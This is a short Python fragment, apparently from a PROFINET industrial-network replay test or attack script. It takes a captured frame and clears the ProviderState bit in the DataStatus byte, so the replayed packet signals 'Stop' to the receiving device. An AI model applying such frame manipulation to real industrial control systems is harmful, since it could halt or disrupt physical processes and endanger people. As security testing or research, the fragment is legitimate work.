# Fourth Scenario: Replay with field manipulation (ProviderState = 0 “Stop”)
...
# turn the hex text into real bytes
_payload_bytes = bytearray(bytes.fromhex(" ".join(PROFINET_PAYLOAD_HEX.split())))

# DataStatus is the second-to-last byte; clear ProviderState bit (0x10) to go from 0x35 -> 0x25
DATASTATUS_INDEX = -2
_payload_bytes[DATASTATUS_INDEX] &= ~0x10  # clear ProviderState bit

PROFINET_PAYLOAD = bytes(_payload_bytes)
